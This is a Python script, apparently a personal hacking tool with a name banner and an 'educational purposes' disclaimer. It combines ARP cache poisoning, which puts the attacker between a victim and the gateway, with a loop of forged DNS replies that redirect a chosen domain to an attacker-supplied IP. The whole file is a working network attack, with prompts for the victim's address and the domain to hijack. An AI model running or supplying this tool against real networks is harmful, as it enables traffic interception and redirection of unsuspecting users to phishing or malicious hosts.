#!/usr/bin/env python3
import logging
import time
import random
import signal
import sys
import threading
import socket
from scapy.all import *
from pyfiglet import Figlet
from termcolor import colored

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def is_valid_ip(ip_str):
    """Check if the string is a valid IPv4 address."""
    try:
        socket.inet_aton(ip_str)
        return True
    except socket.error:
        return False

def attacker_mac():
    """Returns the MAC address of the attacker's default interface."""
    try:
        return get_if_hwaddr(conf.iface)
    except Exception as e:
        logging.error(f"Error getting attacker's MAC: {e}")
        return "00:00:00:00:00:00"

def get_mac(ip):
    """
    Returns the MAC address for the given IP by sending an ARP request.
    Input:
        ip (str): The IP address to query.
    Returns:
        MAC address as a string, or None if not found.
    """
    try:
        ans, _ = sr(ARP(op=ARP.who_has, pdst=ip), timeout=2, verbose=0)
        for sent, received in ans:
            return received.hwsrc
    except Exception as e:
        logging.error(f"Error in get_mac for IP {ip}: {e}")
    return None

def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac):
    """Restores the ARP tables of the victim and gateway."""
    logging.info("Restoring ARP tables...")
    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=0)
    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=victim_mac), count=5, verbose=0)
    logging.info("ARP tables restored.")

def arp_spoof(victim_ip, gateway_ip):
    """
    Continuously sends ARP poison packets to the victim and gateway.
    Positions the attacker in a MITM position.
    """
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)
    if victim_mac is None or gateway_mac is None:
        logging.error("Failed to obtain MAC addresses. Exiting ARP spoofing thread.")
        return

    logging.info(f"Victim MAC: {victim_mac} | Gateway MAC: {gateway_mac}")
    try:
        while True:
            # Poison victim: tell victim that gateway's IP is at attacker's MAC
            send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=attacker_mac()), verbose=0)
            # Poison gateway: tell gateway that victim's IP is at attacker's MAC
            send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=attacker_mac()), verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)
        sys.exit(0)
    except Exception as e:
        logging.error(f"Error in ARP spoofing: {e}")

def dns_spoof(victim_ip, domain, fake_ip):
    """Continuously sends forged DNS responses to the victim for the specified domain."""
    logging.info("Starting DNS spoofing...")
    try:
        while True:
            spoofed_pkt = (IP(dst=victim_ip) / UDP(dport=53) /
                           DNS(id=random.randint(1, 65535), qr=1, aa=1,
                               qd=DNSQR(qname=domain, qtype="A"),
                               an=DNSRR(rrname=domain, ttl=10, rdata=fake_ip)))
            send(spoofed_pkt, verbose=0)
            logging.info(f"Spoofed {domain} -> {fake_ip} for victim {victim_ip}")
            time.sleep(1)
    except KeyboardInterrupt:
        logging.info("Stopping DNS spoofing...")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Error in DNS spoofing: {e}")
        sys.exit(1)

def signal_handler(sig, frame):
    logging.info("Exiting gracefully...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def display_banner():
    """Display the disclaimer and your name in a colorful, big style."""
    f = Figlet(font='slant')
    banner = f.renderText("Sujal Lamichhane")
    print(colored(banner, 'cyan'))
    disclaimer = (
        "===================================\n"
        "Disclaimer: This tool is for educational and ethical purposes only.\n"
        "By running this tool, you agree not to use it for malicious activities.\n"
        "Any illegal use of this tool is the sole responsibility of the user.\n"
        "===================================\n"
    )
    print(colored(disclaimer, 'red'))

def main():
    display_banner()
    time.sleep(2)
    
    # Gather user inputs and strip extra whitespace
    victim_ip = input(colored("Enter Victim's IP Address: ", 'yellow')).strip()
    gateway_ip = input(colored("Enter Gateway/DNS Server's IP Address: ", 'yellow')).strip()
    domain = input(colored("Enter Domain to Spoof (e.g., www.example.com): ", 'yellow')).strip()
    fake_ip = input(colored("Enter Fake IP Address to Redirect to (e.g., 192.168.1.100): ", 'yellow')).strip()

    # Validate IP addresses
    if not (is_valid_ip(victim_ip) and is_valid_ip(gateway_ip) and is_valid_ip(fake_ip)):
        logging.error("One or more IP addresses are invalid. Please check your input.")
        sys.exit(1)

    if not domain:
        logging.error("Domain cannot be empty. Please check your input.")
        sys.exit(1)

    # Start ARP spoofing in a separate thread for MITM positioning
    arp_thread = threading.Thread(target=arp_spoof, args=(victim_ip, gateway_ip))
    arp_thread.daemon = True
    arp_thread.start()

    # Start DNS spoofing (runs continuously until interrupted)
    dns_spoof(victim_ip, domain, fake_ip)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
